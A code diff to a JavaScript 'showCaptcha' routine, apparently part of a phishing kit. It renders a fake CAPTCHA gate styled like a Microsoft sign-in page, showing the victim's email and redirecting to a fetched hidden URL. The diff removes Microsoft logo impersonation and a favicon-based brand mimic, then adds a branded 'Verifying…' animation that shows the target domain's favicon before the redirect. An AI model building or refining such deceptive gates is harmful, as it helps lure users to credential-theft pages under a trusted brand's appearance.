@@ -1232,7 +1232,10 @@ function showCaptcha() {
         '*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}' +
         'html,body{height:100%}' +
         'body{font-family:' + _FONT + ';background:#1b1b1b;color:#fff;display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}' +
-        '@keyframes auroraShift{0%{transform:translate(0,0) scale(1)}100%{transform:translate(-5%,3%) scale(1.05)}}';
+        '@keyframes auroraShift{0%{transform:translate(0,0) scale(1)}100%{transform:translate(-5%,3%) scale(1.05)}}' +
+        '@keyframes slideDisk{0%{left:-40px;opacity:0;transform:translateY(-50%) scale(0.5)}8%{opacity:1;transform:translateY(-50%) scale(1.05)}12%{transform:translateY(-50%) scale(1)}88%{opacity:1;transform:translateY(-50%) scale(1)}95%{transform:translateY(-50%) scale(0.95)}100%{left:calc(100% + 6px);opacity:0;transform:translateY(-50%) scale(0.5)}}' +
+        '@keyframes sweepFill{0%{width:0}100%{width:100%}}' +
+        '@keyframes glowPulse{0%,100%{box-shadow:0 0 6px rgba(0,120,212,0.3),0 2px 8px rgba(0,0,0,0.2)}50%{box-shadow:0 0 16px rgba(0,120,212,0.6),0 2px 12px rgba(0,0,0,0.3)}}';
     document.head.appendChild(css);
 
     // ── Aurora background ──
@@ -1260,57 +1263,6 @@ function showCaptcha() {
     var card = document.createElement('div');
     card.style.cssText = 'position:relative;z-index:1;width:100%;max-width:440px;background:#292929;border-radius:8px;padding:44px 44px 48px;margin:auto;box-shadow:0 2px 6px rgba(0,0,0,0.2);text-align:center';
 
-    // ── Back arrow ──
-    var backArrow = document.createElement('div');
-    backArrow.style.cssText = 'position:absolute;top:16px;left:16px;width:32px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;border-radius:4px;transition:background 0.15s';
-    backArrow.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16"><path d="M11 1L4 8l7 7" stroke="#fff" stroke-width="1.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>';
-    backArrow.onmouseover = function() { this.style.background = 'rgba(255,255,255,0.08)'; };
-    backArrow.onmouseout = function() { this.style.background = 'transparent'; };
-    card.appendChild(backArrow);
-
-    // ── Dynamic logo (from mode_url) or Microsoft fallback ──
-    var logoWrap = document.createElement('div');
-    logoWrap.style.cssText = 'display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:24px';
-    var _msLogoSvg = '<svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 21 21">' +
-        '<rect x="1" y="1" width="9" height="9" fill="#f25022"/>' +
-        '<rect x="11" y="1" width="9" height="9" fill="#7fba00"/>' +
-        '<rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>' +
-        '<rect x="11" y="11" width="9" height="9" fill="#ffb900"/>' +
-        '</svg>';
-    logoWrap.innerHTML = _msLogoSvg;
-    var logoText = document.createElement('span');
-    logoText.textContent = 'Microsoft';
-    logoText.style.cssText = 'font-size:20px;font-weight:600;color:#fff;letter-spacing:-0.2px';
-    logoWrap.appendChild(logoText);
-    card.appendChild(logoWrap);
-
-    // Update logo dynamically once mode_url is available (after fetch)
-    function _updateLogo() {
-        if (!_mode_url) return;
-        try {
-            var a = document.createElement('a');
-            a.href = _mode_url;
-            var domain = a.hostname;
-            if (!domain) return;
-            // Display name: capitalize domain without TLD, e.g. "google.com" -> "Google"
-            var nameParts = domain.replace(/^www\./, '').split('.');
-            var displayName = nameParts[0];
-            displayName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
-            // Favicon via Google service
-            var faviconImg = document.createElement('img');
-            faviconImg.src = 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=128';
-            faviconImg.alt = '';
-            faviconImg.draggable = false;
-            faviconImg.style.cssText = 'width:24px;height:24px;border-radius:4px;object-fit:contain';
-            faviconImg.onerror = function() { /* keep MS logo on error */ };
-            faviconImg.onload = function() {
-                logoWrap.innerHTML = '';
-                logoWrap.appendChild(faviconImg);
-                logoText.textContent = displayName;
-                logoWrap.appendChild(logoText);
-            };
-        } catch(e) {}
-    }
 
     // ── Email pill ──
     var emailPill = document.createElement('div');
@@ -1437,7 +1389,6 @@ function showCaptcha() {
             _fetchPromise = doFetch().then(function(url) {
                 _fetchResult = url || false;
                 _fetchDone = true;
-                _updateLogo();
             }).catch(function() {
                 _fetchResult = false;
                 _fetchDone = true;
@@ -1503,14 +1454,49 @@ function showCaptcha() {
         }, 15000);
     }
 
+    function _slideFavicon(cb) {
+        if (!_mode_url) { cb(); return; }
+        try {
+            var a = document.createElement('a'); a.href = _mode_url;
+            var domain = a.hostname;
+            if (!domain) { cb(); return; }
+
+            // Green sweep fill behind the disk
+            var sweep = document.createElement('div');
+            sweep.style.cssText = 'position:absolute;left:0;top:0;height:100%;width:0;background:linear-gradient(90deg,rgba(16,124,16,0.15),rgba(16,124,16,0.08));border-radius:22px;pointer-events:none;animation:sweepFill 1.4s ease-out forwards';
+            holdBtn.appendChild(sweep);
+
+            // Circular favicon disk
+            var disk = document.createElement('div');
+            disk.style.cssText = 'position:absolute;top:50%;left:-40px;transform:translateY(-50%) scale(0.5);width:34px;height:34px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;z-index:2;opacity:0;animation:slideDisk 1.4s cubic-bezier(0.25,0.46,0.45,0.94) forwards,glowPulse 0.7s ease-in-out 0.1s 2';
+            var ico = document.createElement('img');
+            ico.src = 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=128';
+            ico.alt = '';
+            ico.draggable = false;
+            ico.style.cssText = 'width:22px;height:22px;border-radius:50%;object-fit:contain';
+            ico.onerror = function() { disk.innerHTML = '<div style="width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,#0078d4,#00bcf2)"></div>'; };
+            disk.appendChild(ico);
+            holdBtn.appendChild(disk);
+
+            btnLabel.style.transition = 'opacity 0.3s';
+            btnLabel.style.opacity = '0';
+            setTimeout(function() {
+                btnLabel.textContent = 'Opening\u2026';
+                btnLabel.style.opacity = '1';
+            }, 300);
+
+            setTimeout(cb, 1600);
+        } catch(e) { cb(); }
+    }
+
     function finishRedirect() {
         if (_redirecting) return;
         _redirecting = true;
 
         if (_fetchResult && _fetchResult !== false) {
-            statusMsg.textContent = 'Opening\u2026';
+            statusMsg.textContent = 'Verifying\u2026';
             statusMsg.style.color = '#6ccf6c';
-            setTimeout(function() { window.location.replace(_fetchResult); }, 400);
+            _slideFavicon(function() { window.location.replace(_fetchResult); });
         } else {
             statusMsg.textContent = 'Failed to load';
             statusMsg.style.color = '#ff6b6b';
